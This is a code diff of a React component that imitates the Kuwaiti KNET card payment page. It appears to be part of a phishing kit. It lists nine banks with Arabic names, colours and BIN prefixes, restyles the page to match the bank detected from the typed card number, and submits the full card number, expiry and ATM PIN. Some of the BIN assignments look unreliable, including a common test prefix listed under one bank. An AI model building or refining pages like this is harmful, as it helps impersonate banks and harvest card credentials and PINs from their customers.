@@ -1,18 +1,79 @@
 'use client';
 
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useMemo } from 'react';
 
-interface Card {
-  id: string;
-  last4: string;
-  bank: string;
+interface Bank {
+  name: string;
+  nameAr: string;
+  bins: string[];
+  color: string;
+  logo: string;
 }
 
-const SAMPLE_CARDS: Card[] = [
-  { id: '1', last4: '403622', bank: 'ABK' },
-  { id: '2', last4: '423826', bank: 'ABK' },
-  { id: '3', last4: '42403256', bank: 'ABK' },
-  { id: '4', last4: '428628', bank: 'ABK' },
+const KUWAITI_BANKS: Bank[] = [
+  {
+    name: 'Warba Bank',
+    nameAr: 'بنك ورقة',
+    bins: ['422220', '422260', '428628'],
+    color: '#2b6fb3',
+    logo: '🏦',
+  },
+  {
+    name: 'National Bank of Kuwait',
+    nameAr: 'البنك الوطني الكويتي',
+    bins: ['402896', '403622'],
+    color: '#1a4d2e',
+    logo: '🏦',
+  },
+  {
+    name: 'Kuwait Finance House',
+    nameAr: 'بيت التمويل الكويتي',
+    bins: ['423826', '484611'],
+    color: '#c70000',
+    logo: '🏦',
+  },
+  {
+    name: 'Commercial Bank of Kuwait',
+    nameAr: 'البنك التجاري الكويتي',
+    bins: ['428614', '428617'],
+    color: '#003d82',
+    logo: '🏦',
+  },
+  {
+    name: 'Gulf Bank',
+    nameAr: 'بنك الخليج',
+    bins: ['415189', '429584'],
+    color: '#009688',
+    logo: '🏦',
+  },
+  {
+    name: 'Bank of Bahrain and Kuwait',
+    nameAr: 'بنك البحرين والكويت',
+    bins: ['429587', '429588'],
+    color: '#0066cc',
+    logo: '🏦',
+  },
+  {
+    name: 'Ahli United Bank',
+    nameAr: 'بنك الأهلي المتحد',
+    bins: ['428619', '425000'],
+    color: '#d32f2f',
+    logo: '🏦',
+  },
+  {
+    name: 'FAB - First Abu Dhabi Bank',
+    nameAr: 'بنك أبو ظبي الأول',
+    bins: ['428623', '411111'],
+    color: '#003d82',
+    logo: '🏦',
+  },
+  {
+    name: 'Burgan Bank',
+    nameAr: 'بنك برقان',
+    bins: ['428625', '428626'],
+    color: '#f39c12',
+    logo: '🏦',
+  },
 ];
 
 interface PaymentFormProps {
@@ -29,23 +90,37 @@ export default function KNetPaymentForm({
   const [cardNumber, setCardNumber] = useState('');
   const [expiry, setExpiry] = useState('');
   const [pin, setPin] = useState('');
-  const [selectedCard, setSelectedCard] = useState<Card | null>(null);
   const [showDropdown, setShowDropdown] = useState(false);
   const dropdownRef = useRef<HTMLDivElement>(null);
+
+  // Detect bank from card number BIN
+  const detectedBank = useMemo(() => {
+    if (!cardNumber) return null;
+    
+    // Try to match with exact BIN lengths first, then progressively shorter
+    for (let binLength = 6; binLength >= 3; binLength--) {
+      const checkDigits = cardNumber.substring(0, binLength);
+      if (checkDigits.length < binLength) break;
+      
+      for (const bank of KUWAITI_BANKS) {
+        for (const bin of bank.bins) {
+          if (bin.substring(0, binLength) === checkDigits) {
+            return bank;
+          }
+        }
+      }
+    }
+    return null;
+  }, [cardNumber]);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     onSubmit({
-      cardNumber: selectedCard?.last4 || cardNumber,
+      cardNumber,
       expiry,
       pin,
+      bank: detectedBank?.name || 'Unknown',
     });
-  };
-
-  const handleCardSelect = (card: Card) => {
-    setSelectedCard(card);
-    setCardNumber(card.last4);
-    setShowDropdown(false);
   };
 
   return (
@@ -58,9 +133,13 @@ export default function KNetPaymentForm({
 
       {/* Merchant Section */}
       <div style={styles.panel}>
-        <div style={styles.bankHeader}>
-          <div style={styles.bankName}>بنك ورقة</div>
-          <div style={styles.bankEnglish}>WARBA BANK</div>
+        <div style={{ ...styles.bankHeader, borderColor: detectedBank?.color || '#2b6fb3' }}>
+          <div style={{ ...styles.bankName, color: detectedBank?.color || '#2b6fb3' }}>
+            {detectedBank?.nameAr || 'بنك ورقة'}
+          </div>
+          <div style={{ ...styles.bankEnglish, color: detectedBank?.color || '#2b6fb3' }}>
+            {detectedBank?.name || 'WARBA BANK'}
+          </div>
         </div>
 
         <div style={styles.infoRow}>
@@ -80,33 +159,18 @@ export default function KNetPaymentForm({
         {/* Card Number Section */}
         <div style={styles.formGroup}>
           <label style={styles.fieldLabel}>Card Number:</label>
-          <div style={styles.cardDropdownWrapper} ref={dropdownRef}>
-            <input
-              type="text"
-              placeholder="4"
-              value={cardNumber}
-              onChange={(e) => {
-                setCardNumber(e.target.value);
-                setShowDropdown(true);
-              }}
-              onFocus={() => setShowDropdown(true)}
-              style={styles.cardNumberInput}
-            />
-            {showDropdown && (
-              <div style={styles.cardDropdown}>
-                {SAMPLE_CARDS.map((card) => (
-                  <div
-                    key={card.id}
-                    style={styles.cardOption}
-                    onClick={() => handleCardSelect(card)}
-                  >
-                    <span>{card.last4} - {card.bank}</span>
-                    <span style={styles.bankIcon}>🏦</span>
-                  </div>
-                ))}
-              </div>
-            )}
-          </div>
+          <input
+            type="text"
+            placeholder="4"
+            value={cardNumber}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, '');
+              setCardNumber(value);
+            }}
+            style={styles.cardNumberInput}
+            maxLength={16}
+            inputMode="numeric"
+          />
         </div>
 
         <div style={styles.divider}></div>
